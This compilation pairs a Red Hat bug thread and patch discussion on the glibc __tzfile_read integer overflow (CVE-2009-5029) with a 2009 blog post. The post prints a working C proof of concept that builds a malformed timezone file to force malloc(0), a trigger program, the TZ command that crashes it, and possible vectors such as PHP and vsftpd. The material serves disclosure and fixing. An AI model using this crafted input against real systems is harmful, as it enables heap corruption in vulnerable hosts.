As y'all may be aware, there's an integer overflow which can be used
to trigger a heap overrun/corruption in time/tzfile.c

<http://dividead.wordpress.com/2009/06/01/glibc-timezone-integer-overflow/>

<http://rcvalle.com/post/14169476482/exploiting-glibc-tzfile-read-integer-overflow-to>

I'm not terribly familiar with the code in question, but ISTM we have
to verify the intermediate computations to determine the amount of
memory to malloc don't overflow/wrap.

Here's a WIP.  It catches the cases I've been made aware of
(overflowing total_size to 0 by creating a tzfile with a very large
tzh_charcnt).  But there may be further overflows I've missed.

Obviously it's not commented and it's unclear to me if we also want to
put in some kind of sanity checks on total_size to prevent it from
trying to malloc unreasoanble amounts of memory.

Your feedback would be greatly appreciated.

| [Description](show_bug.cgi?id=761245#c0)  Ramon de C Valle    2011-12-07 22:06:21 UTC  ``` There exists a integer overflow to buffer overflow vulnerability within __tzfile_read function of the GNU C Library. This vulnerability was published by dividead early in 2009 in the following blog post:  <http://dividead.wordpress.com/2009/06/01/glibc-timezone-integer-overflow/>  In December 3, Kingcope, at Full Disclosure Mailing List, noted vsftpd as one possible attack vector for this issue:  <http://lists.grok.org.uk/pipermail/full-disclosure/2011-December/084452.html>   ```  [Comment 10](show_bug.cgi?id=761245#c10)  Ramon de C Valle    2011-12-13 16:29:25 UTC  ``` Exploiting glibc __tzfile_read integer overflow to buffer overflow and vsftpd <http://rcvalle.com/post/14169476482/exploiting-glibc-tzfile-read-integer-overflow-to>   ```  [Comment 13](show_bug.cgi?id=761245#c13)  Ramon de C Valle    2011-12-14 16:46:37 UTC  ``` Created glibc tracking bugs for this issue  Affects: fedora-all [[bug 767696](show_bug.cgi?id=767696 "CLOSED ERRATA - CVE-2009-5029 glibc: __tzfile_read integer overflow to buffer overflow [fedora-all]")]   ```  [Comment 14](show_bug.cgi?id=761245#c14)  Ramon de C Valle    2011-12-15 14:23:49 UTC  ``` More on exploiting glibc __tzfile_read integer overflow to buffer overflow and vsftpd <http://rcvalle.com/post/14261796328/more-on-exploiting-glibc-tzfile-read-integer-overflow>   ```  [Comment 15](show_bug.cgi?id=761245#c15)  Jeff Law    2011-12-15 16:41:42 UTC  ``` So I'm just coming up to speed on this problem.  If I've read things correctly, the problem is the integer overflow if mr. badguy constructs a bogus tzfile.  The integer overflow is used to generate a "useful" size for the malloc call.  After that I'm a bit lost, though it may not matter.  ISTM we need to verify that the computation of total_size, tzspec_len don't overflow nor does total_size + tzspec_len + extra overflow.  If an overflow is detected it appears we can safely "goto lose".  Does that match your interpretation of the core issue and what needs to be changed to resolve it?  Having never worked with security errata before, are there restrictions on discussing it on the upstream mailing lists or with the upstream developers privately?   ```  [Comment 16](show_bug.cgi?id=761245#c16)  Ramon de C Valle    2011-12-15 18:13:04 UTC  ``` Hi Jeff,  There are a few more checks to be made beyond these. I recommend contacting the developers for an appropriate correction. Feel free to publicly discuss this issue on mailing-lists since it is public since earlier 2009.   ```  [Comment 17](show_bug.cgi?id=761245#c17)  Tomas Hoger    2011-12-16 11:14:06 UTC  ``` (In reply to [comment #15](show_bug.cgi?id=761245#c15)) > The integer overflow is used to generate a "useful" size for the malloc call.  > After that I'm a bit lost, though it may not matter.  This is a common flaw pattern - an integer overflow / wrap around in the expression used to compute size passed to malloc results in an allocation of the buffer of the insufficient size.  Later processing, however, tries to write more data to the buffer, resulting in (heap-based) buffer overflow, i.e. possibly exploitable memory corruption.   ```  [Comment 18](show_bug.cgi?id=761245#c18)  Tomas Hoger    2011-12-16 11:14:57 UTC  ``` Upstream bug and discussion:  <http://sourceware.org/bugzilla/show_bug.cgi?id=13506> <http://sourceware.org/ml/libc-alpha/2011-12/msg00037.html>   ```  [Comment 19](show_bug.cgi?id=761245#c19)  Tomas Hoger    2012-01-05 19:03:34 UTC  ``` Upstream commits:  <http://sourceware.org/git/?p=glibc.git;a=commitdiff;h=97ac2654b2d831acaa18a2b018b0736245903fd2> <http://sourceware.org/git/?p=glibc.git;a=commitdiff;h=8fa26d571d4b87a1c7a7f19f1365f7e5d2995933>   ```  [Comment 20](show_bug.cgi?id=761245#c20)  Fedora Update System    2012-01-17 20:24:39 UTC  ``` glibc-2.14.1-5 has been pushed to the Fedora 15 stable repository.

## glibc timezone integer overflow *2009/06/01*

*Posted by dividead in [Security](https://dividead.wordpress.com/category/security/).

Years ago I found a cute integer overflow in the timezone handling in glibc, but back then I put it on my list of ‘bugs to check out in the future if I have more time’. Of course I never found this time (the density of my blog updates gives a nice impression of my spare time), but was surprised that the problem still exists in recent versions of glibc.

I present it here, as I do not feel like contacting glibc upstream about this issue knowing the maintainer is even more friendly, cooperative, and socially well-adapted than a certain OpenBSD maintainer. <http://blog.aurel32.net/?p=47> illustrates this nicely.

Before wasting time of my readers, I want to point out that the impact of this bug is not extensive, and I’d be surprised if someone would manage to make a decent exploit out of this.

The problem is in the \_\_tzfile\_read function present in glibc, and a paste of the source code follows. I took the liberty of cutting the irrelevant parts out, to not bother the reader with details.

```

void
__tzfile_read (const char *file, size_t extra, char **extrap)
{
  ...
  if (file == NULL)
    /* No user specification; use the site-wide default.  */
    file = TZDEFAULT;
  else if (*file == '')
    /* User specified the empty string; use UTC with no leap seconds.  */
    goto ret_free_transitions;
  else
    {
      /* We must not allow to read an arbitrary file in a setuid
         program.  So we fail for any file which is not in the
         directory hierachy starting at TZDIR
         and which is not the system wide default TZDEFAULT.  */
      if (__libc_enable_secure
          && ((*file == '/'
               && memcmp (file, TZDEFAULT, sizeof TZDEFAULT)
               && memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))
              || strstr (file, "../") != NULL))
        /* This test is certainly a bit too restrictive but it should
           catch all critical cases.  */
        goto ret_free_transitions;
    }
  ...
  num_transitions = (size_t) decode (tzhead.tzh_timecnt);
  num_types = (size_t) decode (tzhead.tzh_typecnt);
  chars = (size_t) decode (tzhead.tzh_charcnt);
  num_leaps = (size_t) decode (tzhead.tzh_leapcnt);
  num_isstd = (size_t) decode (tzhead.tzh_ttisstdcnt);
  num_isgmt = (size_t) decode (tzhead.tzh_ttisgmtcnt);
  ...
  total_size = num_transitions * (sizeof (time_t) + 1);
  total_size = ((total_size + __alignof__ (struct ttinfo) - 1)
                & ~(__alignof__ (struct ttinfo) - 1));
  types_idx = total_size;
  total_size += num_types * sizeof (struct ttinfo) + chars;
  total_size = ((total_size + __alignof__ (struct leap) - 1)
                & ~(__alignof__ (struct leap) - 1));
  leaps_idx = total_size;
  total_size += num_leaps * sizeof (struct leap);
  tzspec_len = (sizeof (time_t) == 8 && trans_width == 8
                ? st.st_size - (ftello (f)
                                + num_transitions * (8 + 1)
                                + num_types * 6
                                + chars
                                + num_leaps * 8
                                + num_isstd
                                + num_isgmt) - 1 : 0);

  /* Allocate enough memory including the extra block requested by the
     caller.  */
  transitions = (time_t *) malloc (total_size + tzspec_len + extra);
  if (transitions == NULL)
    goto lose;
  ...
      if (__builtin_expect (fread_unlocked (transitions, trans_width + 1,
                                            num_transitions, f)
                            != num_transitions, 0))
        goto lose;

```

The first thing I want to point out is the limited scope of this issue. The checks starting on line 17 limit the use of the TZ environment variable (the file parameter to \_\_tzfile\_read is derived from the TZ environment variable in other places in the source code), protecting against using arbitrary timezone files in SUID and SGID files. A funny detail is the check on line 21, which does not account for TZ ending with a double-dot, so we’re able to have \_\_tzfile\_read open the directory above the default timezone database directory. For the rest something will likely return EISDIR doing this, so it is useless.

Another thing to note is that TZDIR is a variable mentioned in sysdeps/generic/unsecvars.h so we will not be able to use this in SUID or SGID files either. This means that we will not be able to exploit this problem in an easy local situation.

Before continuing, lets look at the bug closely first. In lines 27 through 32 \_\_tzfile\_read parses some parameters from a timezone file, and lines 34 through 50 perform some calculations based on them. On line 54 malloc() gets called with parameters which we control, and can easily get to evaluate to 0 or something similar. Finally on line 58 we read the timezone data in this allocated buffer using a variable evaluated in a different way, leading to a perfectly controllable heap overflow.

Code to generate such a trigger follows:

```

#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <string.h>

#define TZ_MAGIC        "TZif"

#define PUT_32BIT_MSB(cp, value)                                        \
        do {                                                            \
                (cp)[0] = (value) >> 24;                                \
                (cp)[1] = (value) >> 16;                                \
                (cp)[2] = (value) >> 8;                                 \
                (cp)[3] = (value);                                      \
        } while (0)

struct tzhead {
        char    tzh_magic[4];
        char    tzh_version[1];
        char    tzh_reserved[15];
        char    tzh_ttisgmtcnt[4];
        char    tzh_ttisstdcnt[4];
        char    tzh_leapcnt[4];
        char    tzh_timecnt[4];
        char    tzh_typecnt[4];
        char    tzh_charcnt[4];
};

struct ttinfo
  {
    long int offset;
    unsigned char isdst;
    unsigned char idx;
    unsigned char isstd;
    unsigned char isgmt;
  };

int main(void)
{
        struct tzhead evil;
        int i;
        char *p;
        uint32_t total_size;
        uint32_t evil1, evil2;

        /* Initialize static part of the header */
        memcpy(evil.tzh_magic, TZ_MAGIC, sizeof(TZ_MAGIC) - 1);
        evil.tzh_version[0] = 0;
        memset(evil.tzh_reserved, 0, sizeof(evil.tzh_reserved));
        memset(evil.tzh_ttisgmtcnt, 0, sizeof(evil.tzh_ttisgmtcnt));
        memset(evil.tzh_ttisstdcnt, 0, sizeof(evil.tzh_ttisstdcnt));
        memset(evil.tzh_leapcnt, 0, sizeof(evil.tzh_leapcnt));
        memset(evil.tzh_typecnt, 0, sizeof(evil.tzh_typecnt));

        /* Initialize nasty part of the header */
        evil1 = 500;
        PUT_32BIT_MSB(evil.tzh_timecnt, evil1);

        total_size = evil1 * (sizeof(time_t) + 1);
        total_size = ((total_size + __alignof__ (struct ttinfo) - 1)
                & ~(__alignof__ (struct ttinfo) - 1));

        /* value of chars, to get a malloc(0) */
        evil2 = 0 - total_size;
        PUT_32BIT_MSB(evil.tzh_charcnt, evil2);

        p = (char *)&evil;
        for (i = 0; i < sizeof(evil); i++)
                printf("%c", p&#91;i&#93;);

        /* data we overflow with */
        for (i = 0; i < 50000; i++)
                printf("A");
}
&#91;/sourcecode&#93;

__tzfile_read can be reached through many functions, such as tzset() and localtime() so as an example from a non-s&#91;ug&#93;id file we can use the following:

&#91;sourcecode language='c'&#93;
#include <time.h>

main()
{
        time_t t = time(NULL);
        localtime(&t);
}

```

 `[dividead test]$ ./mkevil > evil ; TZ=`pwd`/evil ./a.out

*** glibc detected *** ./a.out: free(): invalid next size (fast): 0x000000000192a270 ***`

Now that we know for sure this bug is exploitable, we need to determine the cases where this can actually happen. Due to the security checking glibc does the scope is very limited, and we need to have a program which allows us to control either the TZ or the TZDIR environment variables somehow.

A possible example is the old style method to set timezones in PHP assuming it is not running in safe-mode. This was accomplished through putenv(“TZ=/foo/bar/evil”); and funnily PHP will immediatly call tzset() whenever it encounters a putenv() on TZ. This indeed results in PHP crashes, but of course one needs to be able to upload files in the first place, have PHP perform a putenv on data (either completely, in which case we have many more security issues, or on the value part to TZ or TZDIR) we control, and have PHP not running in safe mode.

Maybe more interesting options are possible.
